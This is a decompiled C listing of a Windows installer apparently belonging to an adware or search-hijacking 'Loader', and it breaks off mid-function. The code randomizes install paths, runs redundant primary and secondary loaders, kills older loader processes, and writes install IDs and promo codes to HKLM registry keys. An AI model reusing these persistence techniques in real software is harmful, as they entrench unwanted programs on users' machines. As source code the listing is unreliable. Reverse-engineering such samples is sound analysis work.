    FUN_0041546e(local_10c,(byte *)s_Install_ID_not_detected_in_the_r_004062c4);
    FUN_004116e9(param_1,extraout_DL_01,s_Loader_004051a0,
                 s_Copy_PromoCode_InstallID_DateIns_0040633c,local_10c);
  }
  iVar1 = FUN_004123b0(local_114,(HKEY)0x80000002,param_3,s_installed_004062b8,param_6);
  if (iVar1 != 0) {
    FUN_0041546e(local_10c,(byte *)s_Installed_Value_not_detected_in_t_00406288);
    FUN_004116e9(param_1,extraout_DL_02,s_Loader_004051a0,
                 s_Copy_PromoCode_InstallID_DateIns_0040633c,local_10c);
  }
  local_4 = 0xffffffff;
  FUN_0041205e(local_114);
  *unaff_FS_OFFSET = local_c;
  return;
}



int __cdecl
FUN_0040f8d0(int param_1,int param_2,int param_3,char *param_4,undefined4 *param_5,int *param_6,
            LPBYTE param_7,LPBYTE param_8)

{
  char cVar1;
  char *pcVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined4 *puVar6;
  char *pcVar7;
  undefined4 *puVar8;
  undefined4 *unaff_FS_OFFSET;
  LPVOID local_e24;
  int local_e20;
  int local_e1c;
  int local_e18;
  undefined4 local_e14 [2];
  char local_e0c [256];
  char local_d0c [256];
  char local_c0c [1024];
  char local_80c [1024];
  char local_40c [1024];
  undefined4 local_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_0041e1eb;
  local_c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_c;
  FUN_00412030(local_e14,param_1);
  puVar6 = param_5;
  for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar6 = 0;
    puVar6 = puVar6 + 1;
  }
  puVar6 = &DAT_00422e4c;
  for (iVar3 = 0x100; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar6 = 0;
    puVar6 = puVar6 + 1;
  }
  local_4 = 0;
  local_e1c = 0;
  local_e24 = (LPVOID)0x0;
  local_e20 = 0;
  if (param_2 == -1) {
    local_e18 = FUN_00413957(param_1,*(LPCSTR *)(param_3 + 0x1c),&DAT_0040658c,(byte *)&DAT_00422e4c
                             ,&DAT_00405018,&local_e24);
    FUN_0041546e(local_e0c,(byte *)s_Checking_for_duplicate_installs_00406568);
    FUN_004116e9(param_1,extraout_DL,s_Loader_004051a0,s_Set_App_Path_00406558,local_e0c);
    iVar3 = FUN_0040c650(param_1,(LPBYTE)param_5,s_SOFTWARE_CSAP_00406540,&DAT_00406550);
    if (iVar3 != 0) {
      FUN_0041546e(local_c0c,&DAT_00404364);
      FUN_0041546e(local_80c,(byte *)s__s_Loader_00406534);
      FUN_0041546e(local_40c,(byte *)s__s__s_0040460c);
      FUN_0040f750(param_1,s_SOFTWARE_CSAP_00406540,local_80c,(LPBYTE)param_6,param_7,param_8);
    }
    iVar3 = FUN_0040c650(param_1,(LPBYTE)param_5,s_SOFTWARE_CSBB_0040651c,&DAT_00406550);
    if (iVar3 != 0) {
      FUN_0041546e(local_c0c,&DAT_00404364);
      FUN_0041546e(local_80c,(byte *)s__s_Loader_00406534);
      FUN_0041546e(local_40c,(byte *)s__s__s_0040460c);
      FUN_0040f750(param_1,s_SOFTWARE_CSBB_0040651c,local_80c,(LPBYTE)param_6,param_7,param_8);
    }
    iVar3 = FUN_0040c650(param_1,(LPBYTE)param_5,s_SOFTWARE_CNTRC_00406504,&DAT_00406550);
    if (iVar3 != 0) {
      FUN_0041546e(local_c0c,&DAT_00404364);
      FUN_0041546e(local_80c,(byte *)s__s_Loader_00406534);
      FUN_0041546e(local_40c,(byte *)s__s__s_0040460c);
      FUN_0040f750(param_1,s_SOFTWARE_CNTRC_00406504,local_80c,(LPBYTE)param_6,param_7,param_8);
    }
    local_e1c = FUN_0040c650(param_1,(LPBYTE)param_5,s_SOFTWARE_CLRSCH_004064ec,&DAT_00406550);
    if (local_e1c != 0) {
      FUN_0041546e(local_c0c,&DAT_00404364);
      FUN_0041546e(local_80c,(byte *)s__s_Loader_00406534);
      FUN_0041546e(local_40c,(byte *)s__s__s_0040460c);
      FUN_0040f750(param_1,s_SOFTWARE_CLRSCH_004064ec,local_80c,(LPBYTE)param_6,param_7,param_8);
    }
    iVar3 = local_e18;
    FUN_00413016();
    FUN_004116e9(param_1,extraout_DL_00,s_Loader_004051a0,s_Set_App_Path_00406558,
                 s_Calling_Terminate_Old_Loader_Pro_004064b8);
    FUN_0040f2d0(param_1,&local_e24,iVar3);
    iVar3 = -1;
    puVar6 = &DAT_00422e4c;
    do {
      if (iVar3 == 0) break;
      iVar3 = iVar3 + -1;
      cVar1 = *(char *)puVar6;
      puVar6 = (undefined4 *)((int)puVar6 + 1);
    } while (cVar1 != '\0');
    if (iVar3 == -2) {
      FUN_0041546e(local_e0c,(byte *)s_Parsing___s__for_promotion_code__00405330);
      FUN_004116e9(param_1,extraout_DL_01,s_Loader_004051a0,s_Set_App_Path_00406558,local_e0c);
      FUN_0041455b(local_d0c,param_4);
      pcVar2 = FUN_00415e60(local_d0c,'.');
      if (pcVar2 != (char *)0x0) {
        *pcVar2 = '\0';
        pcVar2 = FUN_00415e60(local_d0c,'p');
        if (pcVar2 != (char *)0x0) {
          FUN_004154f3((uint *)(pcVar2 + 1),&DAT_004042f8);
        }
      }
      FUN_0041546e(local_e0c,(byte *)s_sExecutableName____s__004064a0);
      FUN_004116e9(param_1,extraout_DL_02,s_Loader_004051a0,s_Set_App_Path_00406558,local_e0c);
      FUN_0041546e(local_e0c,(byte *)s_nPromoCodeFromLoaderFileName_____00406468);
      FUN_004116e9(param_1,(char)local_e0c,s_Loader_004051a0,s_Set_App_Path_00406558,local_e0c);
      if ((local_e20 == 0x86) && (*param_6 == 0)) {
        FUN_0041546e(local_e0c,(byte *)s_User_has_promo__d__Setting_Appli_0040641c);
        uVar4 = 0xffffffff;
        pcVar2 = s_ProSiteFinder_00406458;
        do {
          pcVar7 = pcVar2;
          if (uVar4 == 0) break;
          uVar4 = uVar4 - 1;
          pcVar7 = pcVar2 + 1;
          cVar1 = *pcVar2;
          pcVar2 = pcVar7;
        } while (cVar1 != '\0');
        uVar4 = ~uVar4;
        puVar6 = (undefined4 *)(pcVar7 + -uVar4);
        puVar8 = &DAT_00422e4c;
        for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {
          *puVar8 = *puVar6;
          puVar6 = puVar6 + 1;
          puVar8 = puVar8 + 1;
        }
        for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
          *(undefined *)puVar8 = *(undefined *)puVar6;
          puVar6 = (undefined4 *)((int)puVar6 + 1);
          puVar8 = (undefined4 *)((int)puVar8 + 1);
        }
      }
      else {
        FUN_0041546e(local_e0c,(byte *)s_No_pre_existing_random_directory_004063d0);
        FUN_00414c18(param_1,8,(char *)&DAT_00422e4c);
      }
      pcVar2 = FUN_00415c0a((uint *)&DAT_00404bb4);
      if (pcVar2 == (char *)0x0) {
        FUN_004145ae((undefined *)&DAT_00422e4c,(char *)&DAT_00422e4c);
      }
    }
    else {
      FUN_0041546e(local_e0c,(byte *)s_Detected_an_existing_random_dire_004063a8);
    }
    FUN_004116e9(param_1,(char)local_e0c,s_Loader_004051a0,s_Set_App_Path_00406558,local_e0c);
  }
  else {
    FUN_00413232(DAT_004251cc,&DAT_00422e4c);
  }
  FUN_0041546e(local_e0c,(byte *)s_App_Path____s_00406398);
  FUN_004116e9(param_1,(char)local_e0c,s_Loader_004051a0,s_Set_App_Path_00406558,local_e0c);
  if (local_e24 != (LPVOID)0x0) {
    FUN_004150a9(local_e24);
  }
  local_4 = 0xffffffff;
  FUN_0041205e(local_e14);
  *unaff_FS_OFFSET = local_c;
  return local_e1c;
}



void __cdecl FUN_0040fe50(int param_1)

{
  char cVar1;
  char *pcVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined extraout_DL_03;
  undefined extraout_DL_04;
  undefined extraout_DL_05;
  undefined extraout_DL_06;
  undefined extraout_DL_07;
  undefined extraout_DL_08;
  undefined extraout_DL_09;
  undefined extraout_DL_10;
  undefined extraout_DL_11;
  undefined4 *puVar6;
  char *pcVar7;
  char *pcVar8;
  undefined4 *puVar9;
  char local_100 [256];
  
  FUN_0041546e(&DAT_0041ee4c,(byte *)s_Software__s_00406890);
  FUN_0041546e(local_100,(byte *)s_sRegistry_ClrSch_Key____s_00406874);
  FUN_004116e9(param_1,extraout_DL,s_Loader_004051a0,s_Set_Filenames_And_Registry_Keys_00406854,
               local_100);
  FUN_0041546e(&DAT_00421e4c,&DAT_00404364);
  FUN_0041546e(local_100,(byte *)s_sRegistry_ClrSch_Loader_Key____s_00406830);
  FUN_004116e9(param_1,extraout_DL_00,s_Loader_004051a0,s_Set_Filenames_And_Registry_Keys_00406854,
               local_100);
  FUN_0041546e(&DAT_0041e648,&DAT_00404364);
  FUN_0041546e(local_100,(byte *)s_sRegistry_ClrSch_Install_ID_Valu_00406808);
  FUN_004116e9(param_1,0,s_Loader_004051a0,s_Set_Filenames_And_Registry_Keys_00406854,local_100);
  FUN_0041546e(&DAT_0041e248,&DAT_00404364);
  FUN_0041546e(local_100,(byte *)s_sRegistry_Date_Installed_Value___004067e0);
  FUN_004116e9(param_1,extraout_DL_01,s_Loader_004051a0,s_Set_Filenames_And_Registry_Keys_00406854,
               local_100);
  FUN_0041546e(&DAT_0041ea4c,&DAT_00404364);
  FUN_0041546e(local_100,(byte *)s_sRegistry_Delay_Report1_Value_____004067bc);
  FUN_004116e9(param_1,extraout_DL_02,s_Loader_004051a0,s_Set_Filenames_And_Registry_Keys_00406854,
               local_100);
  FUN_0041546e(&DAT_0042024c,&DAT_00404364);
  FUN_0041546e(local_100,(byte *)s_sRegistry_Delay_Report2_Value_____00406798);
  FUN_004116e9(param_1,0,s_Loader_004051a0,s_Set_Filenames_And_Registry_Keys_00406854,local_100);
  FUN_0041546e(&DAT_0042124c,&DAT_00404364);
  FUN_0041546e(local_100,(byte *)s_sRegistry_Next_Update_Value____s_00406774);
  FUN_004116e9(param_1,extraout_DL_03,s_Loader_004051a0,s_Set_Filenames_And_Registry_Keys_00406854,
               local_100);
  FUN_0041546e(&DAT_00420a4c,&DAT_00404364);
  FUN_0041546e(local_100,(byte *)s_sRegistry_ClrSch_Loader_Release__00406748);
  FUN_004116e9(param_1,extraout_DL_04,s_Loader_004051a0,s_Set_Filenames_And_Registry_Keys_00406854,
               local_100);
  FUN_0041546e(&DAT_00420e4c,(byte *)s__s_exe_00406740);
  FUN_0041546e(local_100,(byte *)s_sLoader_Filename____s_00406728);
  FUN_004116e9(param_1,0,s_Loader_004051a0,s_Set_Filenames_And_Registry_Keys_00406854,local_100);
  FUN_0041546e(&DAT_00421a4c,&DAT_00404364);
  FUN_0041546e(local_100,(byte *)s_sRegistry_ClrSch_Resolver_Key_____00406704);
  FUN_004116e9(param_1,extraout_DL_05,s_Loader_004051a0,s_Set_Filenames_And_Registry_Keys_00406854,
               local_100);
  FUN_0041546e(&DAT_0042164c,&DAT_00404364);
  FUN_0041546e(local_100,(byte *)s_sRegistry_ClrSch_Num_Resolvers_V_004066d8);
  FUN_004116e9(param_1,extraout_DL_06,s_Loader_004051a0,s_Set_Filenames_And_Registry_Keys_00406854,
               local_100);
  FUN_0041546e(&DAT_0042364c,&DAT_00404364);
  FUN_0041546e(local_100,(byte *)s_sRegistry_ClrSch_Active_Resolver_004066a8);
  FUN_004116e9(param_1,0,s_Loader_004051a0,s_Set_Filenames_And_Registry_Keys_00406854,local_100);
  FUN_0041546e(&DAT_0041fe4c,&DAT_00404364);
  FUN_0041546e(local_100,(byte *)s_sRegistry_ClrSch_Resolver_Status_00406678);
  FUN_004116e9(param_1,extraout_DL_07,s_Loader_004051a0,s_Set_Filenames_And_Registry_Keys_00406854,
               local_100);
  FUN_0041546e(&DAT_0041f24c,&DAT_00404364);
  FUN_0041546e(local_100,(byte *)s_sTmp_Sub_Dir____s_00406664);
  FUN_004116e9(param_1,extraout_DL_08,s_Loader_004051a0,s_Set_Filenames_And_Registry_Keys_00406854,
               local_100);
  FUN_0041546e(&DAT_0041fa4c,&DAT_00404364);
  FUN_0041546e(local_100,(byte *)s_sRegistry_ClrSch_GUID_Value____s_00406640);
  FUN_004116e9(param_1,0,s_Loader_004051a0,s_Set_Filenames_And_Registry_Keys_00406854,local_100);
  FUN_0041546e(&DAT_0042224c,&DAT_00404364);
  FUN_0041546e(local_100,(byte *)s_sRegistry_ClrSch_Promo_Value_____0040661c);
  FUN_004116e9(param_1,extraout_DL_09,s_Loader_004051a0,s_Set_Filenames_And_Registry_Keys_00406854,
               local_100);
  FUN_0041546e(&DAT_0042324c,&DAT_00404364);
  FUN_0041546e(local_100,(byte *)s_sRegistry_ClrSch_Directory_Value_004065f4);
  FUN_004116e9(param_1,extraout_DL_10,s_Loader_004051a0,s_Set_Filenames_And_Registry_Keys_00406854,
               local_100);
  FUN_0041546e(&DAT_0042064c,&DAT_00404364);
  FUN_0041546e(local_100,(byte *)s_sRegistry_ClrSch_ControlSet_Valu_004065cc);
  FUN_004116e9(param_1,0,s_Loader_004051a0,s_Set_Filenames_And_Registry_Keys_00406854,local_100);
  FUN_0041546e(&DAT_00422a4c,&DAT_00404364);
  FUN_0041546e(local_100,(byte *)s_sRegistry_ClrSch_ControlSet_Chec_00406598);
  FUN_004116e9(param_1,extraout_DL_11,s_Loader_004051a0,s_Set_Filenames_And_Registry_Keys_00406854,
               local_100);
  FUN_0041546e(&DAT_0042264c,&DAT_00424254);
  pcVar2 = FUN_00415e60(&DAT_0042264c,'.');
  if (pcVar2 != (char *)0x0) {
    FUN_0041546e(pcVar2,&DAT_00406590);
    return;
  }
  uVar3 = 0xffffffff;
  pcVar2 = &DAT_00406590;
  do {
    pcVar7 = pcVar2;
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    pcVar7 = pcVar2 + 1;
    cVar1 = *pcVar2;
    pcVar2 = pcVar7;
  } while (cVar1 != '\0');
  uVar3 = ~uVar3;
  iVar4 = -1;
  pcVar2 = &DAT_0042264c;
  do {
    pcVar8 = pcVar2;
    if (iVar4 == 0) break;
    iVar4 = iVar4 + -1;
    pcVar8 = pcVar2 + 1;
    cVar1 = *pcVar2;
    pcVar2 = pcVar8;
  } while (cVar1 != '\0');
  puVar6 = (undefined4 *)(pcVar7 + -uVar3);
  puVar9 = (undefined4 *)(pcVar8 + -1);
  for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {
    *puVar9 = *puVar6;
    puVar6 = puVar6 + 1;
    puVar9 = puVar9 + 1;
  }
  for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
    *(undefined *)puVar9 = *(undefined *)puVar6;
    puVar6 = (undefined4 *)((int)puVar6 + 1);
    puVar9 = (undefined4 *)((int)puVar9 + 1);
  }
  return;
}



undefined4
FUN_004103a0(int param_1,undefined4 param_2,undefined4 param_3,int param_4,uint param_5,
            uint *param_6,int param_7,int param_8,int param_9,uint param_10,int param_11,
            LPVOID param_12,int param_13,int param_14,undefined4 param_15)

{
  char cVar1;
  bool bVar2;
  bool bVar3;
  uint *puVar4;
  char *pcVar5;
  undefined3 extraout_var;
  undefined3 extraout_var_00;
  undefined3 extraout_var_01;
  undefined3 extraout_var_02;
  undefined3 extraout_var_03;
  undefined3 extraout_var_04;
  undefined3 extraout_var_05;
  undefined4 uVar6;
  uint uVar7;
  int iVar8;
  uint uVar9;
  void *this;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined extraout_DL_03;
  undefined extraout_DL_04;
  undefined extraout_DL_05;
  undefined uVar10;
  undefined extraout_DL_06;
  undefined extraout_DL_07;
  undefined extraout_DL_08;
  undefined extraout_DL_09;
  undefined extraout_DL_10;
  undefined extraout_DL_11;
  undefined extraout_DL_12;
  undefined extraout_DL_13;
  undefined extraout_DL_14;
  undefined extraout_DL_15;
  undefined extraout_DL_16;
  undefined extraout_DL_17;
  undefined extraout_DL_18;
  undefined extraout_DL_19;
  undefined extraout_DL_20;
  undefined extraout_DL_21;
  undefined extraout_DL_22;
  undefined extraout_DL_23;
  undefined extraout_DL_24;
  undefined extraout_DL_25;
  undefined extraout_DL_26;
  undefined extraout_DL_27;
  undefined extraout_DL_28;
  DWORD DVar11;
  undefined4 *puVar12;
  undefined unaff_DI;
  char *pcVar13;
  undefined4 *puVar14;
  BYTE unaff_retaddr;
  BYTE BVar15;
  int iVar16;
  byte *in_stack_00000080;
  LPCSTR in_stack_00000094;
  char *in_stack_00000098;
  char *in_stack_0000009c;
  undefined1 in_stack_00000124;
  BYTE in_stack_00000260;
  undefined in_stack_00000524;
  uint *in_stack_000024b8;
  char *pcVar17;
  
  FUN_00415a50(unaff_retaddr);
  param_15 = 0;
  FUN_00411660((undefined4 *)&stack0x00000460);
  FUN_00412030(&param_2,&stack0x00000460);
  iVar16 = 0;
  param_8 = 0;
  param_13 = 0;
  param_10 = 0x1000;
  param_12 = (LPVOID)0x0;
  param_5 = 0;
  FUN_004131f9((char *)DAT_004251cc,(undefined4 *)&stack0x00000360);
  DAT_00423a4c = FUN_00411f30(&stack0x00000044,&stack0x00000360);
  puVar4 = FUN_00415a80(in_stack_000024b8,&DAT_00406d44);
  if (puVar4 != (uint *)0x0) {
    param_15 = 1;
    FUN_0041546e(&stack0x00000b68,&DAT_00406d40);
    pcVar5 = FUN_00415e60(&stack0x00000b68,'.');
    if ((DAT_00423a4c == 1) || (DAT_00423a4c == 2)) {
      if (pcVar5 == (char *)0x0) {
        if (DAT_00423a4c == 1) {
          uVar7 = 0xffffffff;
          pcVar5 = s__1_log_00406d30;
          do {
            pcVar17 = pcVar5;
            if (uVar7 == 0) break;
            uVar7 = uVar7 - 1;
            pcVar17 = pcVar5 + 1;
            cVar1 = *pcVar5;
            pcVar5 = pcVar17;
          } while (cVar1 != '\0');
          uVar7 = ~uVar7;
          iVar8 = -1;
          pcVar5 = &stack0x00000b68;
          do {
            pcVar13 = pcVar5;
            if (iVar8 == 0) break;
            iVar8 = iVar8 + -1;
            pcVar13 = pcVar5 + 1;
            cVar1 = *pcVar5;
            pcVar5 = pcVar13;
          } while (cVar1 != '\0');
          puVar12 = (undefined4 *)(pcVar17 + -uVar7);
          puVar14 = (undefined4 *)(pcVar13 + -1);
          for (uVar9 = uVar7 >> 2; uVar9 != 0; uVar9 = uVar9 - 1) {
            *puVar14 = *puVar12;
            puVar12 = puVar12 + 1;
            puVar14 = puVar14 + 1;
          }
          for (uVar7 = uVar7 & 3; uVar7 != 0; uVar7 = uVar7 - 1) {
            *(undefined *)puVar14 = *(undefined *)puVar12;
            puVar12 = (undefined4 *)((int)puVar12 + 1);
            puVar14 = (undefined4 *)((int)puVar14 + 1);
          }
        }
        else {
          if (DAT_00423a4c != 2) goto LAB_00410527;
          uVar7 = 0xffffffff;
          pcVar5 = s__2_log_00406d28;
          do {
            pcVar17 = pcVar5;
            if (uVar7 == 0) break;
            uVar7 = uVar7 - 1;
            pcVar17 = pcVar5 + 1;
            cVar1 = *pcVar5;
            pcVar5 = pcVar17;
          } while (cVar1 != '\0');
          uVar7 = ~uVar7;
          iVar8 = -1;
          pcVar5 = &stack0x00000b68;
          do {
            pcVar13 = pcVar5;
            if (iVar8 == 0) break;
            iVar8 = iVar8 + -1;
            pcVar13 = pcVar5 + 1;
            cVar1 = *pcVar5;
            pcVar5 = pcVar13;
          } while (cVar1 != '\0');
          puVar12 = (undefined4 *)(pcVar17 + -uVar7);
          puVar14 = (undefined4 *)(pcVar13 + -1);
          for (uVar9 = uVar7 >> 2; uVar9 != 0; uVar9 = uVar9 - 1) {
            *puVar14 = *puVar12;
            puVar12 = puVar12 + 1;
            puVar14 = puVar14 + 1;
          }
          for (uVar7 = uVar7 & 3; uVar7 != 0; uVar7 = uVar7 - 1) {
            *(undefined *)puVar14 = *(undefined *)puVar12;
            puVar12 = (undefined4 *)((int)puVar12 + 1);
            puVar14 = (undefined4 *)((int)puVar14 + 1);
          }
        }
      }
      else {
LAB_00410527:
        if (DAT_00423a4c == 1) {
          pcVar17 = s__1_log_00406d30;
        }
        else {
          pcVar17 = s__2_log_00406d28;
        }
        FUN_0041546e(pcVar5,(byte *)pcVar17);
      }
    }
    else {
      uVar7 = 0xffffffff;
      pcVar5 = s__3_log_00406d38;
      do {
        pcVar17 = pcVar5;
        if (uVar7 == 0) break;
        uVar7 = uVar7 - 1;
        pcVar17 = pcVar5 + 1;
        cVar1 = *pcVar5;
        pcVar5 = pcVar17;
      } while (cVar1 != '\0');
      uVar7 = ~uVar7;
      iVar8 = -1;
      pcVar5 = &stack0x00000b68;
      do {
        pcVar13 = pcVar5;
        if (iVar8 == 0) break;
        iVar8 = iVar8 + -1;
        pcVar13 = pcVar5 + 1;
        cVar1 = *pcVar5;
        pcVar5 = pcVar13;
      } while (cVar1 != '\0');
      puVar12 = (undefined4 *)(pcVar17 + -uVar7);
      puVar14 = (undefined4 *)(pcVar13 + -1);
      for (uVar9 = uVar7 >> 2; uVar9 != 0; uVar9 = uVar9 - 1) {
        *puVar14 = *puVar12;
        puVar12 = puVar12 + 1;
        puVar14 = puVar14 + 1;
      }
      for (uVar7 = uVar7 & 3; uVar7 != 0; uVar7 = uVar7 - 1) {
        *(undefined *)puVar14 = *(undefined *)puVar12;
        puVar12 = (undefined4 *)((int)puVar12 + 1);
        puVar14 = (undefined4 *)((int)puVar14 + 1);
      }
    }
    FUN_004116a4(&stack0x00000460,&stack0x00000b68);
    FUN_0041546e(&stack0x00000160,(byte *)s_nLoderMode_is__d_00406d14);
    FUN_004116e9((int)&stack0x00000460,extraout_DL,s_Loader_004051a0,s_WinMain_00406d0c,
                 &stack0x00000160);
    if (DAT_00423a4c == 1) {
      pcVar5 = s____PRIMARY_LOADER____00406cf4;
    }
    else if (DAT_00423a4c == 2) {
      pcVar5 = s____SECONDARY_LOADER____00406cdc;
    }
    else {
      pcVar5 = s____REDUNDANT_LOADER____00406cc4;
    }
    FUN_004116e9((int)&stack0x00000460,extraout_DL_00,s_Loader_004051a0,s_WinMain_00406d0c,pcVar5);
    FUN_0041546e(&stack0x00000160,(byte *)s__s_version__d_starting_____00406ca8);
    FUN_004116e9((int)&stack0x00000460,extraout_DL_01,s_Loader_004051a0,s_WinMain_00406d0c,
                 &stack0x00000160);
  }
  puVar4 = FUN_00415a80(in_stack_000024b8,&DAT_00406ca4);
  uVar10 = extraout_DL_02;
  if (puVar4 != (uint *)0x0) {
    puVar4 = FUN_00415540(in_stack_000024b8,'d');
    uVar7 = 0xffffffff;
    pcVar5 = (char *)((int)puVar4 + 2);
    do {
      pcVar17 = pcVar5;
      if (uVar7 == 0) break;
      uVar7 = uVar7 - 1;
      pcVar17 = pcVar5 + 1;
      cVar1 = *pcVar5;
      pcVar5 = pcVar17;
    } while (cVar1 != '\0');
    uVar7 = ~uVar7;
    puVar12 = (undefined4 *)(pcVar17 + -uVar7);
    puVar14 = (undefined4 *)&stack0x00001368;
    for (uVar9 = uVar7 >> 2; uVar9 != 0; uVar9 = uVar9 - 1) {
      *puVar14 = *puVar12;
      puVar12 = puVar12 + 1;
      puVar14 = puVar14 + 1;
    }
    for (uVar7 = uVar7 & 3; uVar7 != 0; uVar7 = uVar7 - 1) {
      *(undefined *)puVar14 = *(undefined *)puVar12;
      puVar12 = (undefined4 *)((int)puVar12 + 1);
      puVar14 = (undefined4 *)((int)puVar14 + 1);
    }
    FUN_0041546e(&stack0x00000160,(byte *)s_NonRandomLoaderPath_is___s_00406c88);
    FUN_004116e9((int)&stack0x00000460,extraout_DL_03,s_Loader_004051a0,s_WinMain_00406d0c,
                 &stack0x00000160);
    bVar2 = FUN_00413399((int)&stack0x00000460,&stack0x00001368);
    uVar10 = extraout_DL_04;
    if (CONCAT31(extraout_var,bVar2) != 0) {
      FUN_0041340f((int)&stack0x00000460,&stack0x00001368);
      uVar10 = extraout_DL_05;
    }
  }
  if ((DAT_00423a4c != 1) && (DAT_00423a4c != 2)) {
    FUN_004116e9((int)&stack0x00000460,uVar10,s_Loader_004051a0,s_WinMain_00406d0c,
                 s_Primary_and_Secondary_Loader_alr_00406c48);
    goto LAB_00410dae;
  }
  FUN_0041546e(&stack0x00000160,(byte *)s_Running__s_from__s_00406c34);
  FUN_004116e9((int)&stack0x00000460,(char)&stack0x00000160,s_Loader_004051a0,s_WinMain_00406d0c,
               &stack0x00000160);
  FUN_004132b6((char *)DAT_004251cc,(undefined4 *)&stack0x00000a68);
  FUN_0041546e(&stack0x00000968,(byte *)s__s__s_0040460c);
  FUN_0041546e(&stack0x00000160,(byte *)s_Checking_if__s_exists_00406c1c);
  FUN_004116e9((int)&stack0x00000460,extraout_DL_06,s_Loader_004051a0,s_WinMain_00406d0c,
               &stack0x00000160);
  FUN_0040b990(&stack0x00000078,(int)&stack0x00000460);
  uVar7 = FUN_0041dd90(this,in_stack_00000080,&stack0x000000a0);
  if (uVar7 == 0) {
    DVar11 = 0x8ca;
  }
  else {
    DVar11 = 200;
  }
  DAT_0041ea48 = uVar7 != 0;
  param_14 = FUN_0040c2c0((int)&stack0x00000460,(int)&stack0x00000078);
  FUN_0041546e(&DAT_0041f64c,(byte *)s__s__s__s_004053b4);
  bVar2 = FUN_00413399((int)&stack0x00000460,&DAT_0041f64c);
  if (DAT_00423a4c == 1) {
    puVar12 = &DAT_00422e4c;
    for (iVar8 = 0x100; iVar8 != 0; iVar8 = iVar8 + -1) {
      *puVar12 = 0;
      puVar12 = puVar12 + 1;
    }
    bVar3 = FUN_00413399((int)&stack0x00000460,&stack0x00000968);
    if (CONCAT31(extraout_var_01,bVar3) == 0) {
      uVar7 = 0xffffffff;
      param_1 = CONCAT31(extraout_var_01,bVar3);
      FUN_0040f8d0((int)&stack0x00000460,-1,(int)&stack0x00000078,&stack0x00000360,
                   (undefined4 *)&stack0x00000260,(int *)&stack0x00000000,(LPBYTE)&param_1,
                   (LPBYTE)&param_8);
      FUN_00411760((int *)&stack0x00001868,extraout_DL_07,&DAT_00422e4c);
      FUN_0040fe50((int)&stack0x00000460);
    }
    else {
      FUN_0040f8d0((int)&stack0x00000460,0,(int)&stack0x00000078,&stack0x00000360,
                   (undefined4 *)&stack0x00000260,(int *)&stack0x00000000,(LPBYTE)&param_1,
                   (LPBYTE)&param_8);
      FUN_00411760((int *)&stack0x00001868,extraout_DL_08,&DAT_00422e4c);
      FUN_0040fe50((int)&stack0x00000460);
      iVar8 = FUN_004123b0(&param_2,(HKEY)0x80000002,&DAT_00421e4c,&DAT_0041e648,(LPBYTE)&param_1);
      uVar7 = (uint)(iVar8 == 0);
    }
    FUN_004117d0();
    iVar8 = param_14;
    if (param_14 != 0) {
      bVar3 = FUN_00412065(&param_2,(HKEY)0x80000002,&DAT_0041ee4c);
      if (CONCAT31(extraout_var_02,bVar3) == 0) {
        FUN_00412966(&param_2,(HKEY)0x80000002,&DAT_0041ee4c);
      }
      bVar3 = FUN_00412065(&param_2,(HKEY)0x80000002,&DAT_0041ee4c);
      if (CONCAT31(extraout_var_03,bVar3) != 0) {
        bVar3 = FUN_00412065(&param_2,(HKEY)0x80000002,&DAT_00421e4c);
        if (CONCAT31(extraout_var_04,bVar3) == 0) {
          FUN_00412966(&param_2,(HKEY)0x80000002,&DAT_00421e4c);
        }
        bVar3 = FUN_00412065(&param_2,(HKEY)0x80000002,&DAT_00421e4c);
        if (CONCAT31(extraout_var_05,bVar3) != 0) {
          if (uVar7 == 0xffffffff) {
            FUN_004123b0(&param_2,(HKEY)0x80000002,&DAT_00421e4c,&DAT_00420a4c,(LPBYTE)&param_13);
            if (0xd < param_13) goto LAB_00410a80;
            FUN_0041546e(&stack0x00000160,(byte *)s_Creating_loader_version_registry_00406bcc);
            FUN_004116e9((int)&stack0x00000460,extraout_DL_09,s_Loader_004051a0,s_WinMain_00406d0c,
                         &stack0x00000160);
          }
          FUN_004125fb(&param_2,(HKEY)0x80000002,&DAT_00421e4c,&DAT_00420a4c,0xe);
        }
      }
LAB_00410a80:
      if (in_stack_00000260 != '\0') {
        FUN_0041546e(&stack0x00000160,(byte *)s_Copying_GUID_to_the_randomized_r_00406ba0);
        FUN_004116e9((int)&stack0x00000460,extraout_DL_10,s_Loader_004051a0,s_WinMain_00406d0c,
                     &stack0x00000160);
        FUN_004124c2(&param_2,(HKEY)0x80000002,&DAT_0041ee4c,&DAT_0041fa4c,&stack0x00000260);
        if (0 < iVar16) {
          FUN_004125fb(&param_2,(HKEY)0x80000002,&DAT_0041ee4c,&DAT_0042224c,iVar16);
          FUN_0041546e(&stack0x00000160,(byte *)s_Copying_Promo_Code___d__to_the_r_00406b68);
          FUN_004116e9((int)&stack0x00000460,extraout_DL_11,s_Loader_004051a0,s_WinMain_00406d0c,
                       &stack0x00000160);
        }
        if (param_1 != 0) {
          FUN_004125fb(&param_2,(HKEY)0x80000002,&DAT_0041ee4c,&DAT_0041e648,param_1);
          FUN_0041546e(&stack0x00000160,(byte *)s_Copying_Install_ID___d__to_the_r_00406b30);
          FUN_004116e9((int)&stack0x00000460,extraout_DL_12,s_Loader_004051a0,s_WinMain_00406d0c,
                       &stack0x00000160);
        }
        if (0 < param_8) {
          FUN_004125fb(&param_2,(HKEY)0x80000002,&DAT_0041ee4c,&DAT_0041e248,param_8);
          FUN_0041546e(&stack0x00000160,(byte *)s_Copying_Date_Installed___d__to_t_00406af4);
